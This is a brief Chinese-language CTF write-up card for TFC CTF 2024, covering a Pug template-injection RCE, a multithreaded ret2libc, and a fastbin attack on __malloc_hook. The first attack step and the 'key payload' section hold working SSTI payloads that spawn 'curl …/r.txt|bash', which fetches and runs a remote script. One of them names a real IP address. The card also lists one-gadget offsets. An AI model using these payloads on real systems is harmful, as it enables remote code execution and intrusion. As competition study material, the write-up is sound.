---
title: "TFC CTF 2024 WriteUp"
category: web
tags: ["TFC CTF", "web", "pug-ssti", "ret2libc-multithread", "fastbin-attack", "password-manager"]
signals: ["TFC CTF 2024", "pug-ssti", "ret2libc-multithread", "fastbin-attack", "password-manager", "ogg", "ssti", "TFC", "CTF", "writeup", "Pug", "SSTI", "RCE", "ret2libc"]
difficulty: medium
source: "https://www.ctfiot.com/197599.html"
tools: ["curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# TFC CTF 2024 WriteUp

> 赛事：TFC CTF 2024 | 方向：web | 难度：medium | 工具：curl

## 一句话总结

TFC CTF 2024 狼组 writeup：Pug SSTI RCE + 多线程 ret2libc + fastbin attack __malloc_hook。

## 攻击链

1. GREETINGS: pug SSTI #{(function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec(''curl 43.135.142.77:7001/r.txt|bash'')})()}
2. GUARD-THE-BYPASS: 多线程栈溢出 + ret2libc (ogg)
3. ogg = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
4. VSPM: 密码管理器 add/show/delete + 0x78 限制 + bss 指针溢出
5. 构造 fake chunk size + fastbin attack 打 __malloc_hook
6. libc-2.30 __malloc_hook - 0x23 + 0xb 头填充 + ogg[8]=0xe1fa1
7. MCBACK2DABASICS: back2basics 入门题

## 关键 payload

```
%{global.process.mainModule.constructor._load("child_process").exec(''curl ip:7001/r.txt|bash'')}
```

## 经验教训

Pug 模板默认 sandbox 严格，但通过 #{} 表达式可逃逸到 global.process 调 native module。

## 标签

pug-ssti、ret2libc-multithread、fastbin-attack、password-manager、ogg

## 参考来源

- https://www.ctfiot.com/197599.html
- 原文件：TFC_CTF_·_2024_WriteUp.full.md
